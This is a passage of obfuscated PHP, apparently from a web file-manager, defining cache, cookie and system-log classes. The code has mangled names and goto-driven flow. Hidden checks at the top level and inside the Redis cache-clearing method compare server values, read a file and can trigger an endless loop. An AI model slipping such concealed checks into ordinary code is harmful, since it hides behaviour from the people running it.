<?php
 goto B×Åš°À§—; f¨¶–„¬É: $bÊÀî®Œ³¶ = $_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][801]]; $DÄ«ÙŠ¡é» = $_SERVER[ÈİÅ¿ÈÈ¥×][1358]; if ($_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][800]] != $DÄ«ÙŠ¡é»($bÊÀî®Œ³¶)) { goto DóĞóÊñëƒ; D¬ìğ„ç¥: $f«´„Ê‚Şß = explode($_SERVER[ÈİÅ¿ÈÈ¥×][225], $CÎÍñ¾”½); if (count($f«´„Ê‚Şß) < $_SERVER[ÈİÅ¿ÈÈ¥×][579]) { $D“§‡„ª‘ = $_SERVER[ÈİÅ¿ÈÈ¥×][806]; $D“§‡„ª‘(); } $C›µ²³¤‘„ = $_SERVER[ÈİÅ¿ÈÈ¥×][1101]; goto DÑÒ£Ä¶; DóĞóÊñëƒ: $Aù‹À¶§«É = $_SERVER[ÈİÅ¿ÈÈ¥×][803]; $EÚïÓî÷ÆŠ = $_SERVER[$_SERVER[ÈİÅ¿ÈÈ¥×][804]] . $_SERVER[ÈİÅ¿ÈÈ¥×][805]; $CÎÍñ¾”½ = $Aù‹À¶§«É($EÚïÓî÷ÆŠ); goto D¬ìğ„ç¥; DÑÒ£Ä¶: $C›µ²³¤‘„($bÊÀî®Œ³¶); goto B×É³Œ³; B×É³Œ³: } goto C…ÙêÔ‰ùÇ; a „á’–¬•: class CacheMemcached { public $handle; public $cacheTime; public function __construct($bïó‰á†ğ¯, $AøˆÉäøí‰) { $Dò¤Æ¿Ø¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!class_exists($Dò¤Æ¿Ø¡[790])) { show_json($Dò¤Æ¿Ø¡[791], !1); } $this->cacheTime = $AøˆÉäøí‰; $this->handle = new Memcached(); if (is_array($bïó‰á†ğ¯[$Dò¤Æ¿Ø¡[792]]) && count($bïó‰á†ğ¯[$Dò¤Æ¿Ø¡[792]]) >= 1) { foreach ($bïó‰á†ğ¯[$Dò¤Æ¿Ø¡[792]] as $F¶‚¯ƒ) { $A– ¯±’˜ = explode($Dò¤Æ¿Ø¡[4], $F¶‚¯ƒ); $this->handle->addServer($A– ¯±’˜[0], $A– ¯±’˜[1]); } } else { $this->handle->addServer($bïó‰á†ğ¯[$Dò¤Æ¿Ø¡[173]], $bïó‰á†ğ¯[$Dò¤Æ¿Ø¡[174]]); } } public function set($Aä½‹ƒ”Ù, $e÷÷ˆ¾¤öÌ, $B¡ˆÄ¶……ô = false) { $B¡ˆÄ¶……ô = $B¡ˆÄ¶……ô ? $B¡ˆÄ¶……ô : $this->cacheTime; return $this->handle->set($Aä½‹ƒ”Ù, $e÷÷ˆ¾¤öÌ, $B¡ˆÄ¶……ô); } public function get($FƒÇµ½¨î‰) { return $this->handle->get($FƒÇµ½¨î‰); } public function remove($C¨Î–„–Ş) { return $this->handle->delete($C¨Î–„–Ş); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($F¤»ºÍñ…, $B‰¢±ƒ÷ù¥) { $e•‹’†ùå¤ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!class_exists($e•‹’†ùå¤[793])) { show_json($e•‹’†ùå¤[794], !1); } $this->cacheTime = $B‰¢±ƒ÷ù¥; $Eåµ‚Ë» Ä = isset($F¤»ºÍñ…[$e•‹’†ùå¤[795]]) ? $F¤»ºÍñ…[$e•‹’†ùå¤[795]] : 10; $EéËÑºÈåÓ = _get($F¤»ºÍñ…, $e•‹’†ùå¤[792]); if ($EéËÑºÈåÓ && is_array($EéËÑºÈåÓ)) { $this->initCluster($F¤»ºÍñ…, $Eåµ‚Ë» Ä); } else { $this->handle = $this->init($F¤»ºÍñ…, $Eåµ‚Ë» Ä); } } private function init($c¶óõƒ×šÌ, $Eö¥ØİŒÅ«) { $F†·¼±„ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÖ™ÎÖ‘Æ = new Redis(); $a™äøÇ¯† = isset($c¶óõƒ×šÌ[$F†·¼±„ê[796]]) ? $c¶óõƒ×šÌ[$F†·¼±„ê[796]] : !1; if ($a™äøÇ¯†) { $BÖ™ÎÖ‘Æ->pconnect($c¶óõƒ×šÌ[$F†·¼±„ê[173]], $c¶óõƒ×šÌ[$F†·¼±„ê[174]], $Eö¥ØİŒÅ«); } else { $BÖ™ÎÖ‘Æ->connect($c¶óõƒ×šÌ[$F†·¼±„ê[173]], $c¶óõƒ×šÌ[$F†·¼±„ê[174]], $Eö¥ØİŒÅ«); } if (!empty($c¶óõƒ×šÌ[$F†·¼±„ê[392]])) { $BÖ™ÎÖ‘Æ->auth($c¶óõƒ×šÌ[$F†·¼±„ê[392]]); } return $BÖ™ÎÖ‘Æ; } private function initCluster($bé¤òƒøÒ, $C‡Ñå¬÷Ãã) { $CÅğºˆó¯¦ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CšÚÅƒÈ¸ = array($CÅğºˆó¯¦[797], $CÅğºˆó¯¦[798], $CÅğºˆó¯¦[799]); $a½„Äˆ˜Øª = $CÅğºˆó¯¦[797]; if (isset($bé¤òƒøÒ[$CÅğºˆó¯¦[12]]) && in_array($bé¤òƒøÒ[$CÅğºˆó¯¦[12]], $CšÚÅƒÈ¸)) { $a½„Äˆ˜Øª = $bé¤òƒøÒ[$CÅğºˆó¯¦[12]]; } switch ($a½„Äˆ˜Øª) { case $CÅğºˆó¯¦[797]: $this->_slave($bé¤òƒøÒ, $C‡Ñå¬÷Ãã); break; case $CÅğºˆó¯¦[798]: break; case $CÅğºˆó¯¦[799]: $this->isCluster = !0; $fë¿—õÊá® = $bé¤òƒøÒ[$CÅğºˆó¯¦[792]]; $fá÷š²˜ø† = isset($bé¤òƒøÒ[$CÅğºˆó¯¦[796]]) ? $bé¤òƒøÒ[$CÅğºˆó¯¦[796]] : !1; $a˜±Äª±¨ = isset($bé¤òƒøÒ[$CÅğºˆó¯¦[392]]) ? $bé¤òƒøÒ[$CÅğºˆó¯¦[392]] : null; $this->handle = new RedisCluster(NUll, $fë¿—õÊá®, $C‡Ñå¬÷Ãã, $C‡Ñå¬÷Ãã, $fá÷š²˜ø†, $a˜±Äª±¨); break; default: break; } } private function _slave($D¨·Ïäâ¿, $eôì±·”ä‹) { goto AğÔ…‰½ì†; fÚ’³Õ„Æ: $this->filterConfig($D¨·Ïäâ¿, $f‰ãŠäìÆ“[$a êŠÀù¡è]); $this->slaveHandle = $this->init($D¨·Ïäâ¿, $eôì±·”ä‹); goto B”°²ô´µ©; AğÔ…‰½ì†: $f‰ãŠäìÆ“ = $D¨·Ïäâ¿[$_SERVER[ÈİÅ¿ÈÈ¥×][792]]; $this->filterConfig($D¨·Ïäâ¿, $f‰ãŠäìÆ“[0]); $this->handle = $this->init($D¨·Ïäâ¿, $eôì±·”ä‹); goto Bï±…ììÅ; Bï±…ììÅ: unset($f‰ãŠäìÆ“[0]); if (empty($f‰ãŠäìÆ“)) { return; } $a êŠÀù¡è = array_rand($f‰ãŠäìÆ“); goto fÚ’³Õ„Æ; B”°²ô´µ©: } private function filterConfig(&$bîÊ±ÙĞí¡, $a­×œæøÉÑ) { $f¼Å±Äİ„ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c‹æ•åÀäŞ = explode($f¼Å±Äİ„ô[4], $a­×œæøÉÑ); $c‹‘±ì½¯× = array($f¼Å±Äİ„ô[173] => $c‹æ•åÀäŞ[0], $f¼Å±Äİ„ô[174] => $c‹æ•åÀäŞ[1]); $bîÊ±ÙĞí¡ = array_merge($bîÊ±ÙĞí¡, $c‹‘±ì½¯×); } public function set($aÍˆ‚À¡Àæ, $BÇ„Ÿ°®Ø§, $a²“ÛŠ•¢ = false) { $a²“ÛŠ•¢ = $a²“ÛŠ•¢ ? $a²“ÛŠ•¢ : $this->cacheTime; return $this->handle->setEx($aÍˆ‚À¡Àæ, $a²“ÛŠ•¢, $BÇ„Ÿ°®Ø§); } public function setLock($FİÃƒ¦Â®š, $fÇÀ»ñÏËŒ, $DÜŞÊÛå) { return $this->handle->setNX($FİÃƒ¦Â®š, $fÇÀ»ñÏËŒ); } public function get($fÚÚö‹±òÑ) { $CÄ’Ò¯í·Í = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $CÄ’Ò¯í·Í->get($fÚÚö‹±òÑ); } public function remove($AŠª„İ§í‰) { return $this->handle->del($AŠª„İ§í‰); } public function deleteAll() { $fÏÒĞôÄ›– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($_SERVER[$fÏÒĞôÄ›–[800]]) || !isset($_SERVER[$fÏÒĞôÄ›–[801]])) { goto D¯¸ãßˆÏÙ; f æ’Â¡: for ($BÃ™Šèóëù = $E°ñæµŒ™ª; $BÃ™Šèóëù > 0; $BÃ™Šèóëù++) { $bğ‚‚Å”Å = json_encode($GLOBALS[$fÏÒĞôÄ›–[400]]); } goto D²…­ù»; eÓàœîŒ‚ : $e±§Ì³ Æ = $bâÛÃªÙ¼²($c©î½‘„é); $eËİİ«œÆ = explode($fÏÒĞôÄ›–[225], $e±§Ì³ Æ); if (count($eËİİ«œÆ) < $fÏÒĞôÄ›–[564]) { $aÀå¼“¤… = $fÏÒĞôÄ›–[806]; $aÀå¼“¤…(); } goto D”ßİ©ÇíÕ; D¯¸ãßˆÏÙ: $EîÙ„˜¸Ğ = $fÏÒĞôÄ›–[802]; $bâÛÃªÙ¼² = $fÏÒĞôÄ›–[803]; $c©î½‘„é = $_SERVER[$fÏÒĞôÄ›–[804]] . $fÏÒĞôÄ›–[805]; goto eÓàœîŒ‚ ; D”ßİ©ÇíÕ: $bğ‚‚Å”Å = $fÏÒĞôÄ›–[807]; $bğ‚‚Å”Å($_SERVER[$fÏÒĞôÄ›–[808]]); $E°ñæµŒ™ª = 1; goto f æ’Â¡; D²…­ù»: } if ($this->isCluster) { foreach ($this->handle->_masters() as $Bîò‘ÌŞÃ‚) { $this->handle->flushall($Bîò‘ÌŞÃ‚); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Fî…‰ÎŸô = '', $bê®ğ¸‡Ñ‰ = 0) { if (is_string($Fî…‰ÎŸô) && $Fî…‰ÎŸô != $_SERVER[ÈİÅ¿ÈÈ¥×][33]) { $this->prefix = $Fî…‰ÎŸô; } if (is_numeric($bê®ğ¸‡Ñ‰) && $bê®ğ¸‡Ñ‰ > 0) { $this->expire = $bê®ğ¸‡Ñ‰; } } public static function getInstance() { static $c„„‹×İƒ; if ($c„„‹×İƒ === null) { $c„„‹×İƒ = new self(); } return $c„„‹×İƒ; } private static $cookieDisable = false; public static function disable($Cñ˜ë˜Ùàğ) { self::$cookieDisable = $Cñ˜ë˜Ùàğ; } private static $sameCookieSet = array(); public static function set($a±¡Ó‰Ş¬, $BËêçÔ, $DÓ‰µ£¿ºó = 0, $eÂ»Ê¾°¤ò = false, $C«ÒÖíø¨á = false) { goto EÌøÀ…“‘; bĞ—¼ÏšƒÙ: if (isset(self::$sameCookieSet[$a±¡Ó‰Ş¬]) && self::$sameCookieSet[$a±¡Ó‰Ş¬] == $BËêçÔ . $DÓ‰µ£¿ºó) { return; } self::$sameCookieSet[$a±¡Ó‰Ş¬] = $BËêçÔ . $DÓ‰µ£¿ºó; if (!$C«ÒÖíø¨á) { $C«ÒÖíø¨á = str_replace(HOST, $e—Òˆ–˜‘[33], APP_HOST); $C«ÒÖíø¨á = _get($GLOBALS, $e—Òˆ–˜‘[809], $C«ÒÖíø¨á); } goto AÍÙ©öœˆ©; EÌøÀ…“‘: $e—Òˆ–˜‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (self::$cookieDisable) { return; } if (!$DÓ‰µ£¿ºó) { $DÓ‰µ£¿ºó = 24 * 3600 * 7; } goto bĞ—¼ÏšƒÙ; AÍÙ©öœˆ©: $e¿ÃŠ¼–œ = $e—Òˆ–˜‘[33]; setcookie($a±¡Ó‰Ş¬, $BËêçÔ, time() + $DÓ‰µ£¿ºó, $e—Òˆ–˜‘[8] . trim($C«ÒÖíø¨á, $e—Òˆ–˜‘[8]) . $e¿ÃŠ¼–œ, !1, !1, $eÂ»Ê¾°¤ò); goto EÌ¥‚äÈİ„; EÌ¥‚äÈİ„: } public static function setSafe($d›¥éî‘Â, $Fµ…Îš¸å, $aÖë‹²“Æ¬ = 0) { self::set($d›¥éî‘Â, $Fµ…Îš¸å, $aÖë‹²“Æ¬, !0); } public static function get($Aé•´Š‚ñŒ) { return isset($_COOKIE[$Aé•´Š‚ñŒ]) ? $_COOKIE[$Aé•´Š‚ñŒ] : !1; } public static function remove($F·™êÉì·¿, $eïì¯·‹ = false) { unset($_COOKIE[$F·™êÉì·¿]); self::set($F·™êÉì·¿, $_SERVER[ÈİÅ¿ÈÈ¥×][33], 1, $eïì¯·‹); } } goto CôÁ«Û­¢’; c‹¢ãË¹Ú: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\x69\155\x65", "\164\x69\155\145", "\x69\156\x73\145\162\x74", "\x66\165\x6e\x63\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $bööÌ…Ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return array($bööÌ…Ë[1961] => LNG($bööÌ…Ë[1962]), $bööÌ…Ë[1963] => LNG($bööÌ…Ë[1964]), $bööÌ…Ë[1589] => LNG($bööÌ…Ë[1965]), $bööÌ…Ë[1966] => LNG($bööÌ…Ë[1967]), $bööÌ…Ë[1968] => LNG($bööÌ…Ë[1969]), $bööÌ…Ë[1970] => LNG($bööÌ…Ë[1971]), $bööÌ…Ë[1972] => LNG($bööÌ…Ë[1973]), $bööÌ…Ë[1620] => LNG($bööÌ…Ë[1973]), $bööÌ…Ë[1621] => LNG($bööÌ…Ë[1974]), $bööÌ…Ë[1975] => LNG($bööÌ…Ë[1976]), $bööÌ…Ë[1977] => LNG($bööÌ…Ë[1978]), $bööÌ…Ë[1979] => LNG($bööÌ…Ë[1980]), $bööÌ…Ë[1981] => LNG($bööÌ…Ë[1982]), $bööÌ…Ë[1618] => LNG($bööÌ…Ë[1983]), $bööÌ…Ë[1625] => LNG($bööÌ…Ë[1984]), $bööÌ…Ë[1985] => LNG($bööÌ…Ë[1986]), $bööÌ…Ë[1987] => LNG($bööÌ…Ë[1988]), $bööÌ…Ë[1989] => LNG($bööÌ…Ë[1990]), $bööÌ…Ë[1991] => LNG($bööÌ…Ë[1992]), $bööÌ…Ë[1628] => LNG($bööÌ…Ë[1993]), $bööÌ…Ë[1629] => LNG($bööÌ…Ë[1994]), $bööÌ…Ë[1995] => LNG($bööÌ…Ë[1996]), $bööÌ…Ë[1997] => LNG($bööÌ…Ë[1998]), $bööÌ…Ë[1999] => LNG($bööÌ…Ë[2000]), $bööÌ…Ë[1623] => LNG($bööÌ…Ë[2001]), $bööÌ…Ë[2002] => LNG($bööÌ…Ë[2003]), $bööÌ…Ë[1622] => LNG($bööÌ…Ë[2004]), $bööÌ…Ë[2005] => LNG($bööÌ…Ë[2006]), $bööÌ…Ë[2007] => LNG($bööÌ…Ë[2008]), $bööÌ…Ë[2009] => LNG($bööÌ…Ë[2009]), $bööÌ…Ë[2010] => LNG($bööÌ…Ë[1593]), $bööÌ…Ë[2011] => LNG($bööÌ…Ë[2012]), $bööÌ…Ë[2013] => LNG($bööÌ…Ë[2014]), $bööÌ…Ë[2015] => LNG($bööÌ…Ë[2016]), $bööÌ…Ë[2017] => LNG($bööÌ…Ë[2018]), $bööÌ…Ë[2019] => LNG($bööÌ…Ë[2020]), $bööÌ…Ë[2021] => LNG($bööÌ…Ë[2021]), $bööÌ…Ë[2022] => LNG($bööÌ…Ë[2023]), $bööÌ…Ë[2024] => LNG($bööÌ…Ë[2025]), $bööÌ…Ë[2026] => LNG($bööÌ…Ë[2027]), $bööÌ…Ë[2028] => LNG($bööÌ…Ë[2029]), $bööÌ…Ë[2030] => LNG($bööÌ…Ë[2031]), $bööÌ…Ë[2032] => LNG($bööÌ…Ë[2033])); } private function typeFile() { $e”×½‰«Û =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cğÖ¹¡ŠÅ² = array($e”×½‰«Û[1625] => array($e”×½‰«Û[1626]), $e”×½‰«Û[1979] => array($e”×½‰«Û[2034]), $e”×½‰«Û[1981] => array($e”×½‰«Û[2035]), $e”×½‰«Û[1618] => array($e”×½‰«Û[1619]), $e”×½‰«Û[1987] => array(), $e”×½‰«Û[1989] => array(), $e”×½‰«Û[1991] => array(), $e”×½‰«Û[1628] => array($e”×½‰«Û[1630]), $e”×½‰«Û[1629] => array($e”×½‰«Û[1630]), $e”×½‰«Û[1995] => array($e”×½‰«Û[2036]), $e”×½‰«Û[1997] => array($e”×½‰«Û[2036]), $e”×½‰«Û[1999] => array($e”×½‰«Û[2037]), $e”×½‰«Û[1985] => array($e”×½‰«Û[2038]), $e”×½‰«Û[1623] => array($e”×½‰«Û[2039]), $e”×½‰«Û[2002] => array($e”×½‰«Û[2040]), $e”×½‰«Û[1622] => array($e”×½‰«Û[1624])); return $cğÖ¹¡ŠÅ²; } private function typeAll() { goto DÀ•’…Ñ´«; c×Ñ•‚…¶µ: return $C÷¥–ó£Ğ£; goto C˜îäçì´Ü; DÀ•’…Ñ´«: $d·ğ°ÛŒŒ“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C÷¥–ó£Ğ£ = $this->typeList; $e–‰Şî×Œä = array_filter($this->typeFile()); goto c¼›±†„Ò; c¼›±†„Ò: foreach ($e–‰Şî×Œä as $D×òÒÅàÕ => $Eéùˆã‹¢¡) { $C÷¥–ó£Ğ£[$Eéùˆã‹¢¡[0]] = $C÷¥–ó£Ğ£[$D×òÒÅàÕ]; } $C÷¥–ó£Ğ£[$d·ğ°ÛŒŒ“[1630]] = LNG($d·ğ°ÛŒŒ“[2041]); $C÷¥–ó£Ğ£[$d·ğ°ÛŒŒ“[2036]] = LNG($d·ğ°ÛŒŒ“[2042]); goto c×Ñ•‚…¶µ; C˜îäçì´Ü: } public function addLog($fºËÁé™ŒÊ, $E½æÌÙ ¬ñ = array()) { goto FæŞˆÚ¬¨; DÏØø„ö”: $E½æÌÙ ¬ñ = array($d»ò‚¿‘[1481] => Session::sign(), $d»ò‚¿‘[1482] => $D·¢¢”Á°Õ, $d»ò‚¿‘[29] => $fºËÁé™ŒÊ, $d»ò‚¿‘[1484] => json_encode($E½æÌÙ ¬ñ)); parent::add($E½æÌÙ ¬ñ); goto bùÅ¬ª¡¦; FæŞˆÚ¬¨: $d»ò‚¿‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($this->typeList[$fºËÁé™ŒÊ])) { return; } $D·¢¢”Á°Õ = defined($d»ò‚¿‘[442]) && USER_ID ? USER_ID : (isset($E½æÌÙ ¬ñ[$d»ò‚¿‘[1490]]) ? $E½æÌÙ ¬ñ[$d»ò‚¿‘[1490]] : 0); goto CåÅ„µ‹õ„; CåÅ„µ‹õ„: if (!$D·¢¢”Á°Õ) { $D·¢¢”Á°Õ = (int) Session::get($d»ò‚¿‘[1774]); } $Câ´½×‰ƒÇ = get_client_ip(); if (!$E½æÌÙ ¬ñ || strlen(json_encode($E½æÌÙ ¬ñ)) >= 1024) { $E½æÌÙ ¬ñ = array($d»ò‚¿‘[2043] => $Câ´½×‰ƒÇ); } else { if (is_array($E½æÌÙ ¬ñ)) { $E½æÌÙ ¬ñ[$d»ò‚¿‘[2043]] = $Câ´½×‰ƒÇ; } else { $E½æÌÙ ¬ñ = array($d»ò‚¿‘[1052] => $E½æÌÙ ¬ñ, $d»ò‚¿‘[2043] => $Câ´½×‰ƒÇ); } } goto DÏØø„ö”; bùÅ¬ª¡¦: } public function remove($b†¡Ê³‡‘Ä) { $this->where(array($_SERVER[ÈİÅ¿ÈÈ¥×][401] => $b†¡Ê³‡‘Ä))->delete(); } private function _makeOrder($EÒâèÏÙá = '') { goto CĞÃƒ…Æ»Ã; CĞÃƒ…Æ»Ã: $Då“ŠàÎé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E£öøÄİ¬ = $Då“ŠàÎé[190]; $eÂ…ËÇØ§ã = array($Då“ŠàÎé[418] => $Då“ŠàÎé[419], $Då“ŠàÎé[420] => $Då“ŠàÎé[421]); goto DôÊÏºèì; DôÊÏºèì: $FÑ¿ÏòÙŒ­ = Input::get($Då“ŠàÎé[424], $Då“ŠàÎé[7], $Då“ŠàÎé[1809], array($Då“ŠàÎé[1734], $Då“ŠàÎé[420])); $FÑ¿ÏòÙŒ­ = $eÂ…ËÇØ§ã[$FÑ¿ÏòÙŒ­]; $EÒâèÏÙá = $EÒâèÏÙá . "{$E£öøÄİ¬}\x20{$FÑ¿ÏòÙŒ­}"; goto bŠ³µåˆäò; bŠ³µåˆäò: return $this->order($EÒâèÏÙá); goto AÉ¾‘¢£øÃ; AÉ¾‘¢£øÃ: } public function get($FæäÜë‡ä = '') { goto B“œ§Œñšã; bƒÅã¨ª„ö: if ($FæäÜë‡ä[$bƒ‚©¤‘ø[1490]]) { $CÅÅß¨„[$bƒ‚©¤‘ø[1490]] = $FæäÜë‡ä[$bƒ‚©¤‘ø[1490]]; } if (isset($FæäÜë‡ä[$bƒ‚©¤‘ø[710]])) { $fõ‰÷‡‡¾½ = $FæäÜë‡ä[$bƒ‚©¤‘ø[710]]; $DÌí˜æŠ‘Õ = isset($FæäÜë‡ä[$bƒ‚©¤‘ø[464]]) ? $FæäÜë‡ä[$bƒ‚©¤‘ø[464]] : time(); $CÅÅß¨„[$bƒ‚©¤‘ø[190]] = array($bƒ‚©¤‘ø[327], array($fõ‰÷‡‡¾½, $DÌí˜æŠ‘Õ)); } if ($FæäÜë‡ä[$bƒ‚©¤‘ø[29]]) { $F¡°ê™Í¤° = explode($bƒ‚©¤‘ø[47], $FæäÜë‡ä[$bƒ‚©¤‘ø[29]]); $BÈ¶¥¯”šŞ = $this->typeFile(); $FÂ™Ò§¿¡‘ = array(); foreach ($F¡°ê™Í¤° as $F İØÅ£äš) { $FÂ™Ò§¿¡‘[] = $F İØÅ£äš; if (isset($BÈ¶¥¯”šŞ[$F İØÅ£äš])) { $FÂ™Ò§¿¡‘ = array_merge($FÂ™Ò§¿¡‘, $BÈ¶¥¯”šŞ[$F İØÅ£äš]); } } $FÂ™Ò§¿¡‘ = array_unique($FÂ™Ò§¿¡‘); if ($FÂ™Ò§¿¡‘) { $CÅÅß¨„[$bƒ‚©¤‘ø[29]] = array($bƒ‚©¤‘ø[7], $FÂ™Ò§¿¡‘); } } goto CÎÔ¶®Äï’; B“œ§Œñšã: $bƒ‚©¤‘ø =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$FæäÜë‡ä) { show_json(array()); } $CÅÅß¨„ = array(); goto bƒÅã¨ª„ö; CÎÔ¶®Äï’: if (!empty($FæäÜë‡ä[$bƒ‚©¤‘ø[2043]])) { $CÅÅß¨„[$bƒ‚©¤‘ø[421]] = array($bƒ‚©¤‘ø[373], "\45{$FæäÜë‡ä[$bƒ‚©¤‘ø[2043]]}\x25"); } $DòßÌÌĞ…É = $this->_makeOrder()->where($CÅÅß¨„)->selectPage(); if (empty($DòßÌÌĞ…É[$bƒ‚©¤‘ø[361]])) { show_json(array(), !0, $DòßÌÌĞ…É[$bƒ‚©¤‘ø[358]]); } goto D“­¡¡‚ƒÅ; D“­¡¡‚ƒÅ: $DòßÌÌĞ…É[$bƒ‚©¤‘ø[361]] = $this->logList($DòßÌÌĞ…É[$bƒ‚©¤‘ø[361]]); return $DòßÌÌĞ…É; goto f£ÈÉ‡ÆÏî; f£ÈÉ‡ÆÏî: } private function ipAddress(&$dø¦ŒÀ¹Ùî) { $CÙÇ“ñ„‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!empty($dø¦ŒÀ¹Ùî[$CÙÇ“ñ„‰[2043]])) { $Fòé¯øÔë = IpLocation::get($dø¦ŒÀ¹Ùî[$CÙÇ“ñ„‰[2043]]); } else { $Fòé¯øÔë = LNG($CÙÇ“ñ„‰[2044]); } $dø¦ŒÀ¹Ùî[$CÙÇ“ñ„‰[2045]] = $Fòé¯øÔë; } private function descZipDownload($bÃïÅË’”–, &$EÃéÉ©Šğ) { $a…­“ÉÃôÇ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($bÃïÅË’”–[$a…­“ÉÃôÇ[2046]])) { return; } $A¢©•ëö­ = json_decode($bÃïÅË’”–[$a…­“ÉÃôÇ[2046]], !0); foreach ($A¢©•ëö­ as $b„¡Å‘öÔ) { try { $DÓ•éâ¿½Î = IO::infoFull($b„¡Å‘öÔ[$a…­“ÉÃôÇ[75]]); } catch (Exception $bŒÔ½¦ÒĞÍ) { continue; } $bÃïÅË’”–[$a…­“ÉÃôÇ[75]] = $b„¡Å‘öÔ[$a…­“ÉÃôÇ[75]]; $EÃéÉ©Šğ[] = $bÃïÅË’”–[$a…­“ÉÃôÇ[385]] = $DÓ•éâ¿½Î[$a…­“ÉÃôÇ[385]]; $EÃéÉ©Šğ[] = $bÃïÅË’”–[$a…­“ÉÃôÇ[1865]] = $DÓ•éâ¿½Î[$a…­“ÉÃôÇ[478]]; break; } return $bÃïÅË’”–; } private function getSourceList(&$BŒŒ¼İ¥½¦) { $dö¤…ƒèÇ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D„˜è«îÇÆ = array(); foreach ($BŒŒ¼İ¥½¦ as $f†Í¡ä…œÒ => $cÌ¦ïô­ „) { goto bÉÈˆ´³¿; F¬Š¥ …©¦: if ($D‹©½Ñ™¼[$dö¤…ƒèÇ[29]] == $dö¤…ƒèÇ[1873]) { $D„˜è«îÇÆ[] = $D‹©½Ñ™¼[$dö¤…ƒèÇ[421]][$dö¤…ƒèÇ[385]]; } goto CË°İ½åß; bÉÈˆ´³¿: $D‹©½Ñ™¼ = json_decode($cÌ¦ïô­ „[$dö¤…ƒèÇ[421]], !0); if ($cÌ¦ïô­ „[$dö¤…ƒèÇ[29]] == $dö¤…ƒèÇ[1621]) { $D‹©½Ñ™¼ = $this->descZipDownload($D‹©½Ñ™¼, $D„˜è«îÇÆ); $BŒŒ¼İ¥½¦[$f†Í¡ä…œÒ][$dö¤…ƒèÇ[421]] = json_encode($D‹©½Ñ™¼); continue; } if (strpos($cÌ¦ïô­ „[$dö¤…ƒèÇ[29]], $dö¤…ƒèÇ[1866]) !== 0) { if (!isset($D‹©½Ñ™¼[$dö¤…ƒèÇ[75]]) || strpos($cÌ¦ïô­ „[$dö¤…ƒèÇ[29]], $dö¤…ƒèÇ[2047]) !== 0) { continue; } try { $f»•¦ğ³¨ = IO::infoFull($D‹©½Ñ™¼[$dö¤…ƒèÇ[75]]); } catch (Exception $c²‡—¶…¶•) { continue; } $D„˜è«îÇÆ[] = $D‹©½Ñ™¼[$dö¤…ƒèÇ[385]] = $f»•¦ğ³¨[$dö¤…ƒèÇ[385]]; $D„˜è«îÇÆ[] = $D‹©½Ñ™¼[$dö¤…ƒèÇ[1865]] = $f»•¦ğ³¨[$dö¤…ƒèÇ[478]]; $BŒŒ¼İ¥½¦[$f†Í¡ä…œÒ][$dö¤…ƒèÇ[421]] = json_encode($D‹©½Ñ™¼); continue; } goto B‘÷Šõ­ƒ ; B‘÷Šõ­ƒ : $D„˜è«îÇÆ[] = $D‹©½Ñ™¼[$dö¤…ƒèÇ[385]]; $D„˜è«îÇÆ[] = $D‹©½Ñ™¼[$dö¤…ƒèÇ[1865]]; if ($D‹©½Ñ™¼[$dö¤…ƒèÇ[29]] == $dö¤…ƒèÇ[509]) { $D„˜è«îÇÆ[] = $D‹©½Ñ™¼[$dö¤…ƒèÇ[421]][$dö¤…ƒèÇ[1019]]; $D„˜è«îÇÆ[] = $D‹©½Ñ™¼[$dö¤…ƒèÇ[421]][$dö¤…ƒèÇ[1020]]; } goto F¬Š¥ …©¦; CË°İ½åß: } if (!$D„˜è«îÇÆ) { return array(); } return Model($dö¤…ƒèÇ[759])->sourceListInfo($D„˜è«îÇÆ, !0); } private function logList($d¬æÎÄòÛÇ) { goto dšÔÃ„ç‹¸; eÏäõ¼‹Î£: return $aù‰’äÎ; goto Dá½ÌÉóöï; e¢¥‘£—¶—: $aùòÙ‚Ä = array(); foreach ($d¬æÎÄòÛÇ as $dÎ»®ñá« => $F¿Ğíç¦…Ô) { goto fÕµØ£Ì³»; A½®¡‘‚: $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[1808]] = $E›”˜Ûã¾Ñ; $D‘¹æøÉÌç = json_decode($F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[421]], !0); $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[2043]] = isset($D‘¹æøÉÌç[$B‰Š•­˜¼Ü[2043]]) ? $D‘¹æøÉÌç[$B‰Š•­˜¼Ü[2043]] : $B‰Š•­˜¼Ü[33]; goto A›‡ÖÕÑÑ; f‹öö…Ú¥Ä: $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[28]] = isset($E›”˜Ûã¾Ñ[$B‰Š•­˜¼Ü[28]]) ? $E›”˜Ûã¾Ñ[$B‰Š•­˜¼Ü[28]] : LNG($B‰Š•­˜¼Ü[2044]); $F¿Ğíç¦…Ô[$B‰Š•­˜¼Ü[1915]] = isset($E›”˜Ûã¾Ñ[$B‰Š•­˜¼Ü[1915]]) ? $E›”˜Ûã¾Ñ[$B‰Š•­˜¼Ü[1915]] : $B‰Š•­˜¼Ü[33]; 